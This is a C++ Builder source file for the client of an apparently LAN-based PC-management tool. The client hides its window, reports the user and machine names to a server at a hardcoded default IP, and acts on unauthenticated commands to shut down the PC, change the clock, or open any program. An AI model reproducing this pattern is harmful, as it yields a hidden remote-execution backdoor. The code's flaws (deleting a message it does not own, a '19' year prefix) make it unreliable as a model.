//---------------------------------------------------------------------------
#include <vcl.h>
#pragma hdrstop
#include <inifiles.hpp>
#include <dos.h>
#include <shellapi.h>
#include "clientmain.h"
#include "verinfo.h"

//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma link "Decode"
#pragma resource "*.dfm"
TmainForm *mainForm;
const AnsiString trenn = "µ";
const AnsiString verNummer = "Version: 1.2 Client";
AnsiString user;
AnsiString computer;
//---------------------------------------------------------------------------
__fastcall TmainForm::TmainForm(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------
void __fastcall TmainForm::ClientConnect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    mainForm->Hide();
    String login = "i";
    Client->Socket->SendText(trenn+login+trenn+computer+trenn+user+trenn);
}
//---------------------------------------------------------------------------

void __fastcall TmainForm::ClientDisconnect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    String logout = "o";
    Client->Socket->SendText(trenn+logout+trenn+computer+trenn+user+trenn);
}
//---------------------------------------------------------------------------
void __fastcall TmainForm::FormClose(TObject *Sender, TCloseAction &Action)
{
Client->Close();
}
//---------------------------------------------------------------------------

void __fastcall TmainForm::FormCreate(TObject *Sender)
{
user = Decode1->UserName();
computer = Decode1->ComputerName();
TIniFile* t = new TIniFile("./pc_man.ini");
Client->Address = t->ReadString("Client","Address","195.190.20.91");
Client->Port = StrToInt(t->ReadString("Client","Port","1000"));
Client->Active = true;
delete t;
}
//---------------------------------------------------------------------------



void __fastcall TmainForm::FormCloseQuery(TObject *Sender, bool &CanClose)
{
Client->Close();
}
//---------------------------------------------------------------------------

void __fastcall TmainForm::ClientRead(TObject *Sender,
      TCustomWinSocket *Socket)
{
AnsiString *msg = new AnsiString(Client->Socket->ReceiveText());
String option = Decode1->Decode(msg,trenn,1);

if(option == "m"){
    String nach = Decode1->Decode(msg,trenn,2);
    vers->Caption = "Incoming Server Message...";
    vers->verMemo->Text = nach;
    vers->Show();
}
else if(option == "n"){
    String empf = Decode1->Decode(msg,trenn,2);
    if(empf == computer){
        String nach = Decode1->Decode(msg,trenn,3);
        vers->Caption = "Incoming Server Message...";
        vers->verMemo->Text = nach;
        vers->Show();
    }
}
else if(option == "s"){
    time *t = new time();
    t->ti_hour = StrToInt(Decode1->Decode(msg,trenn,2));
    t->ti_min = StrToInt(Decode1->Decode(msg,trenn,3));
    t->ti_sec = StrToInt(Decode1->Decode(msg,trenn,4));
    t->ti_hund = 1;

    settime(t);
    delete t;
}
else if(option == "d"){
    date *d = new date();
    d->da_year = StrToInt("19"+Decode1->Decode(msg,trenn,4));
    d->da_mon = StrToInt(Decode1->Decode(msg,trenn,3));
    d->da_day = StrToInt(Decode1->Decode(msg,trenn,2));
    setdate(d);
    delete d;
}
else if(option == "k"){
    String empf = Decode1->Decode(msg,trenn,2);
    if(empf == computer || (empf == "ALL" & computer != "SERVER")){
        Client->Close();
        TOSVersionInfo vi;
        HANDLE hToken;
        TTokenPrivileges tp;

        vi.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
        GetVersionEx((OSVERSIONINFO *)&vi);
        if(vi.dwPlatformId == VER_PLATFORM_WIN32_NT){
            OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&hToken);
            LookupPrivilegeValue(NULL,"SeShutdownPrivilege",&tp.Privileges[0].Luid);

            tp.PrivilegeCount = 1;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            AdjustTokenPrivileges(hToken,False,&tp,0,(PTOKEN_PRIVILEGES)NULL,0);

            ExitWindowsEx(EWX_SHUTDOWN,0);
        }else {
            ExitWindowsEx(EWX_SHUTDOWN,0);
        }

    }
}
else if(option == "v"){
    String empf = Decode1->Decode(msg,trenn,2);
    if(empf == computer || empf == "ALL"){
        vers->Caption = "Versions Info";
        vers->verMemo->Text = verNummer;
        vers->Show();

    }
}
else if(option == "e"){
    String empf = Decode1->Decode(msg,trenn,2);
    if(empf == computer || empf == "ALL"){
        String f = Decode1->Decode(msg,trenn,3);
        ShellExecute(mainForm->Handle, "open",f.c_str(), NULL, NULL, SW_SHOWNORMAL);
    }
}
else if(option == "x"){
    Client->Close();
    Application->Terminate();
}
delete msg;
}
//---------------------------------------------------------------------------
void __fastcall TmainForm::WMQueryEndSession(TWMQueryEndSession &msg)
{
   Client->Close(); 
   Application->Terminate();
   msg.Result = 1;
   delete &msg;
}










